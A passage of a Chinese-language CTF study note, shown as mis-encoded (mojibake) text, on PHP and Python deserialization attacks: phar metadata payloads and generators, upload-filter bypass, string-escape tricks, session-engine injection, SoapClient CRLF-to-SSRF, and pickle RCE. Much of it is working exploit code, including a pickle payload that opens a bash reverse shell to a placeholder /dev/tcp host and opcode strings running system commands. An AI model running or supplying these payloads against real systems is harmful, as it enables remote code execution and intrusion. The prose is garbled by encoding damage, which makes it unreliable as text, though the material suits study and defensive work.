å…¥2ä¸ªä¸ç›¸ç­‰å¯¹è±¡ï¼Œä½†æ˜¯ä»–ä»¬çš„ __toString é­”æ³•å‡½æ•°è¿”å›çš„ä¸€æ ·ï¼Œå¯ä»¥ç»•è¿‡ ifï¼Œä¸”evalè½¬ä¸ºå­—ç¬¦ä¸²æ—¶æˆ‘ä»¬ä¹Ÿä½¿å…¶å¯ä»¥è¢«æ‰§è¡Œã€‚ æŸ¥æ‰¾å¸¦ __toString çš„ç±»ï¼Œæ»¡è¶³çš„æœ‰ Exception/ErrorException/Error/ParseError/mysqli_sql_exception ç­‰ï¼Œä»¥ Exception ä¸ºä¾‹ï¼Œconstructå‡½æ•°ä¸ºï¼š public function __construct($message = &quot;&quot;, $code = 0, Throwable $previous = null) å®ƒè¿”å›çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å¼‚å¸¸ä¿¡æ¯ï¼Œå¯ä»¥æ§åˆ¶ä¼ å…¥ message å’Œ code çš„å€¼ä¸åŒå³å¯ã€‚ 123$cmd =&#x27;system(&quot;cat /flag&quot;);?&gt;&#x27;;$ex1 = new Exception($cmd);$ex2 = new Exception($cmd,1); unserialize_callback_func + spl_autoloadåœ¨ php manual é‡Œé¢æœ‰ä¸€ä¸ªå¾ˆæœ‰è¶£çš„å˜é‡é…ç½®ï¼Œå¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰çš„ç±»ï¼Œå¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼Œæœ€å…³é”®çš„æ˜¯è¿™ä¸ªé…ç½®æ˜¯ PHP_IN_ALL çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥é€šè¿‡ ini_set æ¥è®¾ç½®ã€‚ æ³¨æ„: unserialize_callback_func æŒ‡ä»¤ å¦‚æœåœ¨ååºåˆ—åŒ–çš„æ—¶å€™éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»ï¼Œåˆ™å¯ä»¥è®¾ç½®å›è°ƒå‡½æ•°ä»¥ä¾›è°ƒç”¨ï¼ˆä»¥å…å¾—åˆ°çš„æ˜¯ä¸å®Œæ•´çš„ object â€œ__PHP_Incomplete_Classâ€ï¼‰ã€‚å¯é€šè¿‡ php.iniã€ini_set() æˆ– .htaccess å®šä¹‰â€˜unserialize_callback_funcâ€™ã€‚æ¯æ¬¡å®ä¾‹åŒ–ä¸€ä¸ªæœªå®šä¹‰ç±»æ—¶å®ƒéƒ½ä¼šè¢«è°ƒç”¨ã€‚è‹¥è¦ç¦æ­¢è¿™ä¸ªç‰¹æ€§ï¼Œåªéœ€ç½®ç©ºæ­¤è®¾å®šã€‚ å¯ä»¥é€šè¿‡ spl_autoload æ¥è‡ªåŠ¨åŠ è½½æœªå®šä¹‰çš„ç±» settingsï¼Œä¼šé»˜è®¤åŠ è½½å½“å‰ç›®å½•ä¸‹ï¼Œä»¥settingsç±»åä¸ºæ–‡ä»¶åï¼Œphp æˆ–è€… inc ä¸ºåç¼€çš„æ–‡ä»¶ï¼Œè¿™æ ·å°±å’Œ settings.inc è”ç³»åˆ°äº†ä¸€èµ·ã€‚ spl_autoload â€” __autoload()å‡½æ•°çš„é»˜è®¤å®ç° spl_autoload ( string $class_name , string $file_extensions = ? ) : void file_extensions: åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œæœ¬å‡½æ•°å…ˆå°†ç±»åè½¬æ¢æˆå°å†™ï¼Œå†åœ¨å°å†™çš„ç±»åååŠ ä¸Š .inc æˆ– .php çš„æ‰©å±•åä½œä¸ºæ–‡ä»¶åï¼Œç„¶ååœ¨æ‰€æœ‰çš„åŒ…å«è·¯å¾„(include paths)ä¸­æ£€æŸ¥æ˜¯å¦å­˜åœ¨è¯¥æ–‡ä»¶ã€‚ â€‹ ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸PHP åœ¨ååºåˆ—åŒ–æ—¶ï¼Œåº•å±‚ä»£ç æ˜¯ä»¥ ; ä½œä¸ºå­—æ®µçš„åˆ†éš”ï¼Œä»¥ &#125; ä½œä¸ºç»“å°¾(å­—ç¬¦ä¸²é™¤å¤–)ï¼Œå¹¶ä¸”æ˜¯æ ¹æ®é•¿åº¦åˆ¤æ–­å†…å®¹çš„ã€‚ ä¾‹å­ï¼š 123456789101112131415161718&lt;?phpfunction filter($string)&#123; return str_replace(&#x27;x&#x27;,&#x27;yy&#x27;,$string);&#125;$username = &quot;peri0d&quot;;$password = &quot;aaaaa&quot;;$user = array($username, $password);var_dump(serialize($user));echo &#x27;\\n&#x27;;$r = filter(serialize($user));var_dump($r);echo &#x27;\\n&#x27;;var_dump(unserialize($r)); æ­£å¸¸æƒ…å†µä¸‹çš„åºåˆ—åŒ–ç»“æœä¸º a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;ã€‚ é‚£å¦‚æœæŠŠ username æ¢æˆ peri0dxxx ï¼Œå…¶å¤„ç†åçš„åºåˆ—åŒ–ç»“æœä¸º a:2:&#123;i:0;s:9:&quot;peri0dyyyyyy&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; ï¼Œ è¿™ä¸ªæ—¶å€™è‚¯å®šä¼šååºåˆ—åŒ–å¤±è´¥ï¼Œå¯ä»¥çœ‹åˆ° s:9:&quot;peri0dyyyyyy&quot; æ¯”ä»¥å‰å¤šäº† 3 ä¸ªå­—ç¬¦ã€‚ å›åˆ°å‰é¢ï¼Œ a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125; å®ƒåœ¨è¿›è¡Œä¿®æ”¹å¯†ç ä¹‹åå°±å˜ä¸º a:2:&#123;i:0;s:6:&quot;peri0d&quot;;i:1;s:6:&quot;123456&quot;;&#125;i:1;s:5:&quot;aaaaa&quot;;&#125;ã€‚ å¯ä»¥çœ‹åˆ°éœ€è¦æ·»åŠ çš„å­—ç¬¦ä¸² &quot;;i:1;s:6:&quot;123456&quot;;&#125; é•¿åº¦ä¸º 20ã€‚ å‡è®¾è¦åœ¨ peri0d åé¢å¡«å…… 4 ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆå°±æ˜¯ s:30:&#39;peri0dxxxx&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; åœ¨ç»è¿‡å¤„ç†ä¹‹åå°±æ˜¯ s:30:&#39;peri0dyyyyyyyy&quot;;i:1;s:6:&quot;123456&quot;;&#125;&#39;; è¯»å– 30 ä¸ªå­—ç¬¦ä¸º peri0dyyyyyyyy&quot;;i:1;s:6:&quot;12345ã€‚ è¿™å°±éœ€è¦ç»§ç»­å¢åŠ å¡«å……å­—ç¬¦ï¼Œåœ¨æœ‰ 20 ä¸ª x æ—¶ï¼Œå°±å®ç°äº†å¯†ç çš„ä¿®æ”¹ã€‚ $6+x+20=6+2x \\Rightarrow x=20$ å¯ä»¥çœ‹åˆ°ï¼Œè¿™å’Œ username å‰é¢çš„ peri0d æ˜¯æ¯«æ— å…³ç³»çš„ï¼Œåªå’Œåšæ›¿æ¢çš„å­—ç¬¦ä¸²æœ‰å…³ã€‚ â€‹ pharååºåˆ—åŒ–pharæ–‡ä»¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§å‹ç¼©æ–‡ä»¶ï¼Œåœ¨ä½¿ç”¨pharåè®®æ–‡ä»¶åŒ…å«æ—¶ï¼Œä¹Ÿæ˜¯å¯ä»¥ç›´æ¥è¯»å–zipæ–‡ä»¶çš„ã€‚ä½¿ç”¨phar://åè®®è¯»å–æ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶ä¼šè¢«è§£ææˆpharå¯¹è±¡ï¼Œpharå¯¹è±¡å†…çš„ä»¥åºåˆ—åŒ–å½¢å¼å­˜å‚¨çš„ç”¨æˆ·è‡ªå®šä¹‰å…ƒæ•°æ®ï¼ˆmetadataï¼‰ä¿¡æ¯ä¼šè¢«ååºåˆ—åŒ–ã€‚è¿™å°±å¼•å‡ºäº†æˆ‘ä»¬æ”»å‡»æ‰‹æ³•æœ€æ ¸å¿ƒçš„æµç¨‹ã€‚ æµç¨‹ï¼šæ„é€ pharï¼ˆå…ƒæ•°æ®ä¸­å«æœ‰æ¶æ„åºåˆ—åŒ–å†…å®¹ï¼‰æ–‡ä»¶â€”&gt;ä¸Šä¼ â€”&gt;è§¦å‘ååºåˆ—åŒ– æœ€åä¸€æ­¥æ˜¯å¯»æ‰¾è§¦å‘pharæ–‡ä»¶å…ƒæ•°æ®ååºåˆ—åŒ–ã€‚å…¶å®phpä¸­æœ‰ä¸€å¤§éƒ¨åˆ†çš„æ–‡ä»¶ç³»ç»Ÿå‡½æ•°åœ¨é€šè¿‡phar://ä¼ªåè®®è§£æpharæ–‡ä»¶æ—¶éƒ½ä¼šå°†meta-dataè¿›è¡Œååºåˆ—åŒ–ã€‚ åˆ©ç”¨æ¡ä»¶ pharæ–‡ä»¶è¦èƒ½å¤Ÿä¸Šä¼ åˆ°æœåŠ¡å™¨ç«¯ã€‚èƒ½è§¦å‘çš„æ–‡ä»¶æ“ä½œå‡½æ•°ï¼š includeã€file_get_contentsã€file_put_contentsã€copyã€fileã€file_existsã€is_executableã€is_fileã€is_dirã€is_linkã€is_writableã€filepermsã€fileinodeã€filesizeã€fileownerã€filegroupã€fileatimeã€filemtimeã€filectimeã€filetypeã€getimagesizeã€exif_read_dataã€statã€lstatã€touchã€md5_file è¦æœ‰å¯ç”¨çš„é­”æœ¯æ–¹æ³•ä½œä¸ºâ€œè·³æ¿â€ã€‚ æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯æ§ï¼Œä¸”:ã€/ã€pharç­‰ç‰¹æ®Šå­—ç¬¦æ²¡æœ‰è¢«è¿‡æ»¤ã€‚ ç”Ÿæˆpharæ–‡ä»¶ é¦–å…ˆå¾—ç”Ÿæˆä¸€ä¸ªå«æœ‰åºåˆ—åŒ–metadataçš„pharæ–‡ä»¶ã€‚phpæä¾›ä¸€ä¸ªç±»å…è®¸æˆ‘ä»¬å¤„ç†pharæ–‡ä»¶ç›¸å…³æ“ä½œã€‚æ³¨æ„è¦è®¾ç½®php.iniä¸­phar.readonly=Offã€‚ 123456789101112131415&lt;?phpclass User &#123; Public $nameï¼›&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºpharï¼Œç”Ÿæˆåå¯ä»¥éšæ„ä¿®æ”¹$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering(); taråŒ…è£…ï¼š 123456789101112131415&lt;?phpclass User &#123; Public $nameï¼›&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;@unlink(&quot;phar.tar&quot;);@system(&#x27;rm -r .phar&#x27;);@system(&#x27;mkdir .phar&#x27;);file_put_contents(&#x27;.phar/.metadata&#x27;,serialize($o));system(&#x27;tar -cf phar.tar .phar/*&#x27;);// phar://./phar.tar// phar:///var/www/html/uploads/phar.tar zipåŒ…è£…ï¼š 12345678910111213141516171819&lt;?phpclass User &#123; Public $nameï¼›&#125;$o = new User(); $o-&gt;name = &#x27;JrXnm&#x27;;$d = serialize($o);if(file_exists(&#x27;phar.zip&#x27;)) &#123; @unlink(&quot;phar.zip&quot;);&#125;$zip = new ZipArchive;$res = $zip-&gt;open(&#x27;phar.zip&#x27;, ZipArchive::CREATE);$zip-&gt;addFromString(&#x27;test.txt&#x27;, &#x27;file content goes here&#x27;);$zip-&gt;setArchiveComment($d);$zip-&gt;close();// phar://./phar.zip// phar:///var/www/html/uploads/phar.zip ä¸Šä¼ åˆ°æœåŠ¡å™¨ pharæ–‡ä»¶æ˜¯å¾ˆå®¹æ˜“ç»•è¿‡ä¸Šä¼ é™åˆ¶çš„ï¼Œé¦–å…ˆå®ƒçš„åç¼€æ˜¯ä¸é™åˆ¶çš„ï¼Œæ”¹æˆä»€ä¹ˆphar://åè®®éƒ½å¯ä»¥è§£æã€‚ å‰é¢è¿™ä¸ªæ ‡å¿—çš„æ ¼å¼ä¸ºxxx&lt;?php xxx; __HALT_COMPILER();?&gt; å‰é¢å†…å®¹ä¸é™ï¼Œè¿™æ ·å¯ä»¥åœ¨å‰é¢æ·»åŠ æ³¨å…¥GIF98aè¿™æ ·çš„æ–‡ä»¶å¤´ç»•è¿‡ä¸Šä¼ é™åˆ¶ã€‚ ååºåˆ—åŒ–æ‰§è¡Œ ç›´æ¥æ‰§è¡Œæµ‹è¯•çš„é‚£ä»½ä»£ç ï¼Œphar://åè®®åœ¨file_get_contentså‡½æ•°ä¸­è§£æpharæ–‡ä»¶ï¼Œå°†å…ƒæ•°æ®ååºåˆ—åŒ–æ‰§è¡Œé­”æ³•å‡½æ•°ã€‚ ç»•è¿‡ phar://ä¸èƒ½å‡ºç°åœ¨é¦–éƒ¨ 123compress.zlib://phar://compress.bzip2://phar://php://filter/resource=phar:// å…³é”®å­— ç»•è¿‡å¦‚ HALT_COMPILERï¼Œä½¿ç”¨ gzip å‘½ä»¤å¤„ç†pharæ–‡ä»¶ï¼š gzip phar.jpg å‚è€ƒï¼šä»ä¸€é“é¢˜å†çœ‹pharçš„åˆ©ç”¨ ä¿®æ”¹pharæ–‡ä»¶ æ”¹pharæ–‡ä»¶å†…å®¹ï¼Œå› pharæ–‡ä»¶æ˜¯æœ‰æ£€éªŒå’Œçš„ï¼Œæ‰€ä»¥ç›´æ¥æ”¹pharæ–‡ä»¶å†…å®¹ä¸å¯è¡Œã€‚ å‚è€ƒï¼šæ€»ç»“ - ctfä¸­phpçš„phar(ä¸€) ä¿®å¤ç­¾åæ•°æ®ï¼š 123456from hashlib import sha1f = open(&#x27;./ph1.phar&#x27;, &#x27;rb&#x27;).read() # ä¿®æ”¹å†…å®¹åçš„pharæ–‡ä»¶s = f[:-28] # è·å–è¦ç­¾åçš„æ•°æ®h = f[-8:] # è·å–ç­¾åç±»å‹ä»¥åŠGBMBæ ‡è¯†newf = s+sha1(s).digest()+h # æ•°æ® + ç­¾å + ç±»å‹ + GBMBopen(&#x27;ph2.phar&#x27;, &#x27;wb&#x27;).write(newf) # å†™å…¥æ–°æ–‡ä»¶ æ„é€ pharç»“æ„ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188from zlib import crc32from struct import packfrom time import timefrom hashlib import md5, sha1, sha256, sha512class PHAR: # ä¸€äº›å¸¸é‡ STUB = b&quot;__HALT_COMPILER(); ?&gt;&quot; GBMB = b&quot;GBMB&quot; MD5 = b&quot;\\x01\\x00\\x00\\x00&quot; SHA1 = b&quot;\\x02\\x00\\x00\\x00&quot; SHA256 = b&quot;\\x03\\x00\\x00\\x00&quot; SHA512 = b&quot;\\x04\\x00\\x00\\x00&quot; def __init__(self, prefix: str, manifestData: dict, filesData: list, signatureType: MD5 ): self.prefix = prefix.encode() self.manifestData = manifestData self.filesData = filesData self.signatureType = signatureType def parse(self): # æ£€æŸ¥æ¸…å•çš„å‚æ•° if any(self.manifestData.get(each) is None for each in [&quot;loc&quot;, &quot;metaData&quot;]): return False # è‡³å°‘è¦å½’æ¡£ä¸€ä¸ªæ–‡ä»¶ if len(self.filesData) == 0: return False # éå†æ£€æŸ¥æ–‡ä»¶çš„å‚æ•° for file in self.filesData: if any(file.get(each) is None for each in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;loc&quot;, &quot;metaData&quot;]): return False # å°†å­—ç¬¦ä¸²è½¬æ¢å­—èŠ‚æµ self.manifestData[&quot;metaData&quot;] = self.manifestData[&quot;metaData&quot;].encode() for file in self.filesData: for key, value in file.items(): if key in [&quot;fileName&quot;, &quot;fileContent&quot;, &quot;metaData&quot;]: file[key] = value.encode() return True def generate(self): # æ£€æŸ¥å‚æ•° if not self.parse(): return b&quot;&quot; phar = b&quot;&quot; # stub stub = self.stub() # manifest manifest = self.manifest() files = self.file() # content contents = self.content() # è®¡ç®—æ€»é•¿åº¦ manifest = pack(&quot;I&quot;, len(manifest + files + contents)) + manifest[4:] # signature signature = self.signature(stub + manifest + files + contents) # é‡æ–°æ‹¼æ¥ phar += stub + manifest + files + contents + signature return phar def stub(self): return self.prefix + self.STUB + b&quot;\\r\\n&quot; def manifest(self): # å½’æ¡£æ–‡ä»¶æ•°é‡ manifest = pack(&quot;I&quot;, len(self.filesData)) # ç‰ˆæœ¬ manifest += b&quot;\\x11\\x00&quot; # æ ‡è¯† manifest += b&quot;\\x00\\x00\\x01\\x00&quot; # åˆ«åé•¿åº¦ manifest += b&quot;\\x00\\x00\\x00\\x00&quot; # å¦‚æœå°†åºåˆ—åŒ–å†…å®¹å­˜å‚¨äºæ­¤ if self.manifestData[&quot;loc&quot;]: # metadataé•¿åº¦ manifest += pack(&quot;I&quot;, len(self.manifestData[&quot;metaData&quot;])) # metadataå†…å®¹ manifest += self.manifestData[&quot;metaData&quot;] else: manifest += pack(&quot;I&quot;, 0) # è¡¥è¶³é•¿åº¦ manifest = pack(&quot;I&quot;, 0) + manifest return manifest def file(self): files = b&quot;&quot; # éå†å½’æ¡£çš„æ–‡ä»¶ for file in self.filesData: # æ–‡ä»¶åé•¿åº¦ files += pack(&quot;I&quot;, len(file[&quot;fileName&quot;])) # æ–‡ä»¶å files += file[&quot;fileName&quot;] # æœªå‹ç¼©å¤§å° files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # æ—¶é—´æˆ³ files += pack(&quot;I&quot;, int(time())) # å‹ç¼©åå¤§å° files += pack(&quot;I&quot;, len(file[&quot;fileContent&quot;])) # CRC32æ ¡éªŒ files += pack(&quot;I&quot;, crc32(file[&quot;fileContent&quot;])) # æ–‡ä»¶æƒé™ files += pack(&quot;I&quot;, 0o666) # å¦‚æœå°†åºåˆ—åŒ–å†…å®¹å­˜å‚¨äºæ­¤ if file[&quot;loc&quot;]: # metadataé•¿åº¦ files += pack(&quot;I&quot;, len(file[&quot;metaData&quot;])) # metadataå†…å®¹ files += file[&quot;metaData&quot;] else: files += pack(&quot;I&quot;, 0) return files def content(self): contents = b&quot;&quot; # éå†æ‰€æœ‰å½’æ¡£æ–‡ä»¶ for file in self.filesData: contents += file[&quot;fileContent&quot;] return contents def signature(self, content): signature = b&quot;&quot; # ç­¾åå†…å®¹ if self.signatureType == self.MD5: signature = md5(content).digest() if self.signatureType == self.SHA1: signature = sha1(content).digest() if self.signatureType == self.SHA256: signature = sha256(content).digest() if self.signatureType == self.SHA512: signature = sha512(content).digest() # ç­¾åæ ‡å¿— signature += self.signatureType # GBMBæ ‡å¿— signature += self.GBMB return signatureif __name__ == &#x27;__main__&#x27;: pharData = &#123; &quot;prefix&quot;: &quot;123&quot;, &quot;manifestData&quot;: &#123; &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &quot;filesData&quot;: [ &#123; &quot;fileName&quot;: &quot;e.txt&quot;, &quot;fileContent&quot;: &quot;dsadawada&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, &#123; &quot;fileName&quot;: &quot;c.txt&quot;, &quot;fileContent&quot;: &quot;123&quot;, &quot;loc&quot;: True, &quot;metaData&quot;: &quot;&quot;&quot;O:1:&quot;e&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;text&quot;;&#125;&quot;&quot;&quot;, &#125;, ], &quot;signatureType&quot;: PHAR.SHA1, &#125; p = PHAR(**pharData).generate() with open(&quot;a.phar&quot;, &quot;wb&quot;) as f: f.write(p) â€‹ PHP sessionååºåˆ—åŒ–PHPä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹ session.save_handler æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_[sessionid]æ¥è¿›è¡Œå‘½åçš„ã€‚ æœ‰ä¸‰ç§æ–¹å¼ï¼š é»˜è®¤ä½¿ç”¨phpï¼šé”®å|é”®å€¼ï¼ˆç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼ï¼‰ name|s:6:&quot;1FonlY&quot;; php_serializeï¼šç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼ a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125; php_binaryï¼šé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼ \u0004names:6:&quot;1FonlY&quot;; ä¸å¯æ˜¾çš„ä¸ºEOT ,nameçš„é•¿åº¦ä¸º4 4åœ¨ASCII è¡¨ä¸­å°±æ˜¯ EOT å½“åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´ã€‚ æ¯”å¦‚è¿™é‡Œå…ˆå®ä¾‹åŒ–ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå°†å…¶åºåˆ—åŒ–ä¸º O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;ï¼Œ å¦‚æœä¼ å…¥ |O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;ï¼Œåœ¨ä½¿ç”¨php_serialize å¼•æ“çš„æ—¶å€™ï¼Œ åºåˆ—åŒ–åçš„session æ–‡ä»¶æ˜¯è¿™æ ·çš„ a:1:&#123;s:4:&quot;name&quot;;s:31:&quot;|O:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125;&quot;;&#125;ï¼Œ è¿™æ—¶ï¼Œå°†a:1:&#123;s:4:&quot;name&quot;;s:31:&quot; å½“åšé”®åï¼ŒO:7:&quot;_1FonlY&quot;:1:&#123;s:3:&quot;cmd&quot;;N;&#125; å½“åšé”®å€¼ï¼Œå°†é”®å€¼è¿›è¡Œååºåˆ—åŒ–è¾“å‡ºï¼Œè¿™æ—¶å°±é€ æˆäº†åºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚ â€‹ Soapååºåˆ—åŒ–SOAP : Simple Object Access Protocolç®€å•å¯¹è±¡è®¿é—®åè®®ã€‚ é‡‡ç”¨HTTPä½œä¸ºåº•å±‚é€šè®¯åè®®ï¼ŒXMLä½œä¸ºæ•°æ®ä¼ é€çš„æ ¼å¼ï¼Œæ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³•ã€‚ CRLFæ¼æ´ SOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\\x0d\\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ã€‚ ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typeï¼Œä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ®ã€‚ åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ï¼Œuser_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼ã€‚ 123456789101112131415161718&lt;?php$target = &#x27;http://127.0.0.1:5555/path&#x27;;$post_string = &#x27;data=something&#x27;;$headers = array( &#x27;X-Forwarded-For: 127.0.0.1&#x27;, &#x27;Cookie: PHPSESSID=my_session&#x27; );$b = new SoapClient(null,array(&#x27;location&#x27; =&gt; $target,&#x27;user_agent&#x27;=&gt;&#x27;wupco^^Content-Type: application/x-www-form-urlencoded^^&#x27;.join(&#x27;^^&#x27;,$headers).&#x27;^^Content-Length: &#x27;.(string)strlen($post_string).&#x27;^^^^&#x27;.$post_string,&#x27;uri&#x27;=&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&#x27;^^&#x27;,&quot;\\r\\n&quot;,$aaa);//$aaa = str_replace(&#x27;&amp;&#x27;,&#x27;&amp;&#x27;,$aaa);echo $aaa;//echo urlencode($aaa);//$c = unserialize($aaa);//$c-&gt;not_exists_function();?&gt; å¦‚ä¸Šï¼Œä½¿ç”¨SoapClientååºåˆ—åŒ–+CRLFå¯ä»¥ç”Ÿæˆä»»æ„POSTè¯·æ±‚ã€‚ Deserialization + __call + SoapClient + CRLF = SSRF â€‹ pythonååºåˆ—åŒ–ä¸PHPç±»ä¼¼ï¼Œpythonä¹Ÿæœ‰åºåˆ—åŒ–åŠŸèƒ½ä»¥é•¿æœŸå‚¨å­˜å†…å­˜ä¸­çš„æ•°æ®ã€‚pickleæ˜¯pythonä¸‹çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–åŒ…ã€‚ pythonæœ‰å¦ä¸€ä¸ªæ›´åŸå§‹çš„åºåˆ—åŒ–åŒ…marshalï¼Œç°åœ¨å¼€å‘æ—¶ä¸€èˆ¬ä½¿ç”¨pickleã€‚ ä¸jsonç›¸æ¯”ï¼Œpickleä»¥äºŒè¿›åˆ¶å‚¨å­˜ï¼Œä¸æ˜“äººå·¥é˜…è¯»ï¼›jsonå¯ä»¥è·¨è¯­è¨€ï¼Œè€Œpickleæ˜¯Pythonä¸“ç”¨çš„ï¼›pickleèƒ½è¡¨ç¤ºpythonå‡ ä¹æ‰€æœ‰çš„ç±»å‹ï¼ˆåŒ…æ‹¬è‡ªå®šä¹‰ç±»å‹ï¼‰ï¼Œjsonåªèƒ½è¡¨ç¤ºä¸€éƒ¨åˆ†å†…ç½®ç±»å‹ä¸”ä¸èƒ½è¡¨ç¤ºè‡ªå®šä¹‰ç±»å‹ã€‚ pickleå®é™…ä¸Šå¯ä»¥çœ‹ä½œä¸€ç§ç‹¬ç«‹çš„è¯­è¨€ï¼Œé€šè¿‡å¯¹opcodeçš„æ›´æ”¹ç¼–å†™å¯ä»¥æ‰§è¡Œpythonä»£ç ã€è¦†ç›–å˜é‡ç­‰æ“ä½œã€‚ç›´æ¥ç¼–å†™çš„opcodeçµæ´»æ€§æ¯”ä½¿ç”¨pickleåºåˆ—åŒ–ç”Ÿæˆçš„ä»£ç æ›´é«˜ï¼Œæœ‰çš„ä»£ç ä¸èƒ½é€šè¿‡pickleåºåˆ—åŒ–å¾—åˆ°ï¼ˆpickleè§£æèƒ½åŠ›å¤§äºpickleç”Ÿæˆèƒ½åŠ›ï¼‰ã€‚ 12345678910# pocimport pickleimport base64class A(object): def __reduce__(self): return (eval,(&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \\&quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1\\&quot;&#x27;)&quot;,))poc = A()result = pickle.dumps(poc)result = base64.b64encode(result)print(result) RCE RæŒ‡ä»¤ï¼š 1234b&#x27;&#x27;&#x27;cossystem(S&#x27;whoami&#x27;tR.&#x27;&#x27;&#x27; iæŒ‡ä»¤ï¼š 1234b&#x27;&#x27;&#x27;(S&#x27;whoami&#x27;iossystem.&#x27;&#x27;&#x27; oæŒ‡ä»¤ï¼š 1234b&#x27;&#x27;&#x27;(cossystemS&#x27;whoami&#x27;o.&#x27;&#x27;&#x27; å·¥å…· æ›´æ–¹ä¾¿çš„opcodeç”Ÿæˆå·¥å…·ï¼š EddieIvan01/pker å‚è€ƒï¼š Python-Pickleååºåˆ—åŒ–å®‰å…¨é—®é¢˜ pickleååºåˆ—åŒ–åˆæ¢ Code-Breakingä¸­çš„ä¸¤ä¸ªPythonæ²™ç®± pickleååºåˆ—åŒ–â€”é«˜æ ¡æŠ—â€œç–«â€ç½‘ç»œå®‰å…¨åˆ†äº«èµ› ä»é›¶å¼€å§‹pythonååºåˆ—åŒ–æ”»å‡»ï¼špickleåŸç†è§£æ &amp; ä¸ç”¨reduceçš„RCEå§¿åŠ¿ Pythonååºåˆ—åŒ–æ¼æ´ä¸æ²™ç®±é€ƒé€¸ Pickleååºåˆ—åŒ– 